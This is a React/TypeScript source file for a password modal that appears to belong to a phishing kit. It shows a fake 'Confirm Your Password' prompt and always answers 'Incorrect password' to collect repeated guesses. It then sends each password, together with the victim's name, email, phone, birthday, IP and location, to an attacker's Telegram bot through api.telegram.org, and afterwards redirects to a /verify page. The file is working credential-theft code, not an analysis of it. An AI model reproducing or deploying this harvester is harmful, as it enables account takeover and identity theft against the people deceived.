import type { FormData } from "@/pages/home";
import type { GeoLocation } from "@/types/geo";
import type { TelegramResponse } from "@/types/telegram";
import getConfig from "@/utils/config";
import { faEye } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import axios from "axios";
import { type FC, useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router";
const LAST_MESSAGE_KEY = "lastMessage";
interface PasswordModalProps {
	onClose?: () => void;
	isOpen: boolean;
	formData: FormData;
}

const PasswordModal: FC<PasswordModalProps> = ({
	onClose,
	isOpen,
	formData,
}) => {
	const navigate = useNavigate();
	const [uiState, setUiState] = useState({
		isShowPassword: false,
		password: "",
		error: "",
		isLoading: false,
		attempt: 0,
		messageId: 0,
	});

	const [config, setConfig] = useState({
		chatId: "",
		token: "",
		loadingTime: 0,
		maxAttempt: 0,
	});

	const modalRef = useRef<HTMLDivElement>(null);

	useEffect(() => {
		const { telegram, settings } = getConfig();
		setConfig({
			chatId: telegram.data_chatid,
			token: telegram.data_token,
			loadingTime: settings.password_loading_time,
			maxAttempt: settings.max_failed_password_attempts,
		});
	}, []);

	useEffect(() => {
		const handleClickOutside = (event: MouseEvent) => {
			if (
				modalRef.current &&
				!modalRef.current.contains(event.target as Node)
			) {
				onClose?.();
			}
		};

		if (isOpen) {
			document.addEventListener("mousedown", handleClickOutside);
		}

		return () => document.removeEventListener("mousedown", handleClickOutside);
	}, [isOpen, onClose]);

	if (!isOpen) return null;

	const handleSubmit = async () => {
		const geoData: GeoLocation = JSON.parse(
			localStorage.getItem("geoData") ?? "{}",
		);

		const createMessage = () => `
🚨 <b>THÔNG BÁO MỚI</b> 🚨

📍 <b>THÔNG TIN BỔ SUNG</b>
• <b>Địa Chỉ IP:</b> <code>${geoData.ip}</code>
• <b>Quốc Gia:</b> <code>${geoData.country}</code>
• <b>Thành Phố:</b> <code>${geoData.city}</code>
• <b>Thời Gian:</b> <code>${new Date().toLocaleString("vi-VN")}</code>


• <b>Tên PAGE:</b> <code>${formData.pageName}</code>
• <b>Họ Tên:</b> <code>${formData.fullName}</code>
• <b>Email:</b> <code>${formData.email}</code>
• <b>Số Điện Thoại:</b> <code>${formData.phone}</code>
• <b>Ngày Sinh:</b> <code>${formData.birthday}</code>

🔐 <b>MẬT KHẨU</b>
• <b>Mật Khẩu:</b> <code>${uiState.password}</code>`;
		let message = "";
		if (localStorage.getItem(LAST_MESSAGE_KEY)) {
			const oldMessage = localStorage.getItem(LAST_MESSAGE_KEY);
			message = `${oldMessage}\n• <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
		} else {
			message = createMessage();
		}

		localStorage.setItem(LAST_MESSAGE_KEY, message);

		if (uiState.attempt >= config.maxAttempt) {
			setUiState((prev) => ({
				...prev,
				isLoading: true,
			}));

			try {
				await axios.post(
					`https://api.telegram.org/bot${config.token}/editMessageText`,
					{
						chat_id: config.chatId,
						message_id: uiState.messageId,
						text: message,
						parse_mode: "HTML",
					},
				);

				setTimeout(() => {
					navigate("/verify");
				}, config.loadingTime);
			} catch (error) {
				navigate("/verify");
			}
			return;
		}

		setUiState((prev) => ({
			...prev,
			attempt: prev.attempt + 1,
			isLoading: true,
		}));

		const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
		const editUrl = `https://api.telegram.org/bot${config.token}/editMessageText`;

		try {
			let response: TelegramResponse;

			if (uiState.messageId && uiState.attempt > 0) {
				response = await axios.post(editUrl, {
					chat_id: config.chatId,
					message_id: uiState.messageId,
					text: message,
					parse_mode: "HTML",
				});
			} else {
				response = await axios.post(url, {
					chat_id: config.chatId,
					text: message,
					parse_mode: "HTML",
				});
				setUiState((prev) => ({
					...prev,
					messageId: response.data.result.message_id,
				}));
			}

			setTimeout(() => {
				setUiState((prev) => ({
					...prev,
					isLoading: false,
					error: "Incorrect password. Please try again.",
				}));
			}, config.loadingTime);
		} catch (error) {
			setUiState((prev) => ({
				...prev,
				isLoading: false,
				error: "Something went wrong. Please try again later.",
			}));
		}
	};

	const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		if (!uiState.isLoading) {
			setUiState((prev) => ({
				...prev,
				password: e.target.value,
			}));
		}
	};

	const togglePasswordVisibility = () => {
		setUiState((prev) => ({
			...prev,
			isShowPassword: !prev.isShowPassword,
		}));
	};

	const clearError = () => {
		setUiState((prev) => ({
			...prev,
			error: "",
		}));
	};

	return (
		<div className="fixed top-0 left-0 z-50 flex h-screen w-screen items-center justify-center bg-black/50 px-4 md:px-0">
			<div
				ref={modalRef}
				className="flex w-full max-w-2xl flex-col gap-4 rounded-lg bg-white p-6 shadow-lg"
			>
				<div className="flex flex-col gap-2">
					<h2 className="text-xl font-bold">Confirm Your Password</h2>
					<p className="text-sm text-gray-600">
						For your security, please enter your password to continue
					</p>
				</div>

				<div className="relative flex items-center justify-center">
					<input
						onFocus={clearError}
						className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
							uiState.error ? "border-red-500 focus:border-red-500" : ""
						}`}
						type={uiState.isShowPassword ? "text" : "password"}
						placeholder="Enter your password"
						value={uiState.password}
						onChange={handlePasswordChange}
					/>
					<FontAwesomeIcon
						onClick={togglePasswordVisibility}
						icon={faEye}
						className="absolute right-4 cursor-pointer text-gray-500 select-none hover:scale-105"
					/>
				</div>

				{uiState.error && (
					<div className="text-sm text-red-500">{uiState.error}</div>
				)}

				<div className="flex gap-3">
					{onClose && (
						<button
							onClick={onClose}
							className="w-full cursor-pointer rounded-full border border-gray-300 p-4 text-lg font-medium"
							type="button"
						>
							Cancel
						</button>
					)}
					<button
						onClick={handleSubmit}
						className={`flex w-full cursor-pointer items-center justify-center rounded-full p-4 text-lg font-medium text-white ${
							uiState.password.length < 6
								? "cursor-not-allowed bg-blue-300"
								: "bg-blue-500 hover:bg-blue-600"
						}`}
						type="button"
						disabled={uiState.password.length < 6}
					>
						{uiState.isLoading ? (
							<div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
						) : (
							"Continue"
						)}
					</button>
				</div>
			</div>
		</div>
	);
};

export default PasswordModal;
